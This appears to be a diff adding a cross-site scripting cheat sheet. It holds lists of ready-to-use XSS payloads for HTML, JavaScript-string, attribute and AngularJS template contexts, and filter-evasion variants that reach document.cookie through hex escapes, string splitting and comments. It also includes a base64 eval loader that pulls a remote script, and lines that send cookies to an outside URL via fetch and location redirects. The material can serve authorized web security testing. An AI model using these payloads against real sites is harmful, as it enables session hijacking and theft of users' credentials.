@@ -1,0 +1,136 @@
+- Test every input parameter in HTML body, URL query string
+- Use DOM Invader
+
+** Generally
+<>
+<script>alert()</script>
+"><script>alert()</script>
+</script><script>alert()</script>
+
+***** insie Javascript strings *****
+
+'-alert()-'
+"-alert()-"
+';alert()//
+";alert()//
+\';alert()//
+\'-alert()-\'
+\";alert()//
+\"-alert()-\"
+
+${alert()}
+
+<img src=1 oNeRrOr=alert`1`>
+<img src=1 onerror=alert()>
+"><img src=1 onerror=alert()>
+</script><img src=1 onerror=alert()>
+'-<img src=1 onerror=alert()>-'
+';<img src=1 onerror=alert()>//
+\';<img src=1 onerror=alert()>//
+\'-<img src=1 onerror=alert()>-\'
+${<img src=1 onerror=alert()>}
+
+{{$on.constructor('alert()')()}}
+">{{$on.constructor('alert()')()}}
+</script>{{$on.constructor('alert()')()}}
+'-{{$on.constructor('alert()')()}}-'
+';{{$on.constructor('alert()')()}}//
+\';{{$on.constructor('alert()')()}}//
+\'-{{$on.constructor('alert()')()}}-\'
+${{{$on.constructor('alert()')()}}}
+
+" autofocus onfocus=alert() x="
+"onmouseover="alert()
+\" autofocus onfocus=alert() x=\"
+\"onmouseover=\"alert()
+javascript:alert()
+
+
+****************************** XSS Obfuscating ******************************
+
+Unicode encode the Javascript
+
+Unicode escape / Hexadecimal escape / octal escape the Javascript strings
+
+Use superfluous escape characters: eval('a\l\ert\(1)');
+
+HTML encode the Javascript in HTML tag attribute
+
+When "." is filtered: 
+
+- URL/HTML encode "."
+- HTML then URL encode "."
+- document.cookie => window["document"]["cookie"]
+
+********** Add space char:
+document%20.%20cookie
+
+********** Add comments:
+document/*foo*/./*bar*/cookie
+
+window["alert"](window["document"]["cookie"]);
+
+self[/*foo*/"alert"](self[document"/*bar*/]["cookie"]);
+
+********** With lots of comments:
+(/* this is a comment */self/* foo */)[/*bar*/"alert"/**/]("yo")
+
+********** String concatenation:
+self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"])
+
+********** Hex escape: alert(document.cookie)
+self["\x61\x6c\x65\x72\x74"](
+    self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]
+        ["\x63\x6f\x6f\x6b\x69\x65"]
+)
+
+********** Base64-encoded: <script src="http://example.com/evil.js" ...
+self["\x65\x76\x61\x6c"](						
+  self["\x61\x74\x6f\x62"](
+    "dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50\
+    c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyI\
+    HNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbn\
+    QoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGU\
+    oJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2Ny\
+    aXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6L\
+    y9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW\
+    5kQ2hpbGQoc2NyaXB0KTs="
+  )
+)
+
+Global variables: window, self, _self, this, top, parent, frames
+
+********** Call a URL
+fetch("url" + window["document"]["cookie"])
+location = "ur" + window["document"]["cookie"]
+window.document.location = "url" + window["document"]["cookie"]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
